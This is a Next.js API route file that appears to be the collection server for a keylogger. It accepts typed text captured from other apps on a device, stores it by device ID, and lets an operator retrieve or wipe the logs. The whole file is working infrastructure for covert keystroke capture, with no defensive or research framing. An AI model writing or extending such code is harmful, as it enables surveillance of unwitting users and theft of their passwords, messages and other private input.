import { NextRequest, NextResponse } from 'next/server'
import { initSchema } from '@/lib/db'
import { saveKeylog, getKeylogs, clearKeylogs, getOrCreateDevice } from '@/lib/store'

export async function POST(req: NextRequest) {
  try {
    await initSchema()
    const body = await req.json()
    const { deviceId, appPackage, appName, fieldName, text } = body
    if (!deviceId || !text) {
      return NextResponse.json({ error: 'Missing fields' }, { status: 400 })
    }
    await getOrCreateDevice(deviceId)
    await saveKeylog(deviceId, { appPackage: appPackage ?? '', appName: appName ?? '', fieldName: fieldName ?? '', text })
    return NextResponse.json({ ok: true })
  } catch (e) {
    return NextResponse.json({ error: String(e) }, { status: 500 })
  }
}

export async function GET(req: NextRequest) {
  try {
    await initSchema()
    const deviceId = req.nextUrl.searchParams.get('deviceId')
    const limit    = parseInt(req.nextUrl.searchParams.get('limit') ?? '200')
    if (!deviceId) return NextResponse.json({ error: 'Missing deviceId' }, { status: 400 })
    const entries = await getKeylogs(deviceId, limit)
    return NextResponse.json({ entries })
  } catch (e) {
    return NextResponse.json({ error: String(e) }, { status: 500 })
  }
}

export async function DELETE(req: NextRequest) {
  try {
    await initSchema()
    const deviceId = req.nextUrl.searchParams.get('deviceId')
    if (!deviceId) return NextResponse.json({ error: 'Missing deviceId' }, { status: 400 })
    await clearKeylogs(deviceId)
    return NextResponse.json({ ok: true })
  } catch (e) {
    return NextResponse.json({ error: String(e) }, { status: 500 })
  }
}
